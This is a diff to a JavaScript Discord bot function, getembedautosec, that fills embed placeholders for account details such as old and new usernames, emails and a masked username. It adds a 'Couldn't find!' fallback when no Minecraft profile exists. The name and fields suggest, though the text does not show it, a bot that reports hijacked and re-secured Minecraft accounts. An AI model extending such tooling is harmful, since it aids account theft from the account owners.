@@ -41,17 +41,23 @@ async function getembedautosec(client, embed, acc, interaction) {
                 const skywars = acc?.stats?.skywars || {};
                 const duels = acc?.stats?.duels || {};
 
+                const ownsMcText = formatOwnedGames(acc);
+                const isNoMc = ownsMcText === "No Minecraft!" || acc?.mc === "No Minecraft!" || acc?.mc === "XBL Failed" || acc?.hasmc === false;
+                const finalUsername = (isNoMc || !acc?.newName || acc?.newName === acc?.gamertag || acc?.newName === "No Minecraft Profile" || acc?.newName === "No Minecraft!")
+                    ? "Couldn't find!"
+                    : acc.newName;
+
                 const replacements = {
                     "%UID%": acc.uid || "",  
                     "%USER%": interaction.user.username || "",
                     "%USERID%": interaction.user.id || "",
-                    "%OLDNAME%": acc?.oldName || "",
-                    "%NEWNAME%": acc?.newName || "",
-                   "%HIDDENUSERNAME%": acc?.newName ? (
-    acc.newName.length > 2
-        ? acc.newName[0] + '*'.repeat(acc.newName.length - 2) + acc.newName.at(-1)
-        : "*-*"
-) : "",
+                    "%OLDNAME%": finalUsername,
+                    "%NEWNAME%": finalUsername,
+                    "%HIDDENUSERNAME%": finalUsername === "Couldn't find!" ? "Couldn't find!" : (
+                        finalUsername.length > 2
+                            ? finalUsername[0] + '*'.repeat(finalUsername.length - 2) + finalUsername.at(-1)
+                            : "*-*"
+                    ),
                     "%EMAIL%": acc?.email || "",
                     "%OLDEMAIL%": acc?.oldEmail || "",
                     "%HIDDENEMAIL%": acc?.email ? (
